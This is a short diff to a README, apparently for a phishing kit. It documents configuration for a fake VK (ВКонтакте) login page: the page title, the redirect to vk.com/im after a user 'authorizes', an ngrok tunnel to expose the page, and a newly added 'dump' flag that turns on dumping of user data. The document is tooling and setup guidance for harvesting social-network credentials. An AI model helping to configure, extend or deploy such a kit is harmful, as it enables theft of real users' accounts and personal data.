@@ -60,6 +60,7 @@ npm start
 title: Вход | ВКонтакте # Заголовок странички, нужен для превью в соц-сетях
 image: /icon.png # То-же самое что и Заголовок
 exit: https://vk.com/im # URL куда перенаправит успешно авторизованного пользователя
+dump: false # Если true, то включает дампинг данных пользователя
 ngrok: # Конфиг NGrok, см https://ngrok.com/docs#config
   region: eu
 ```
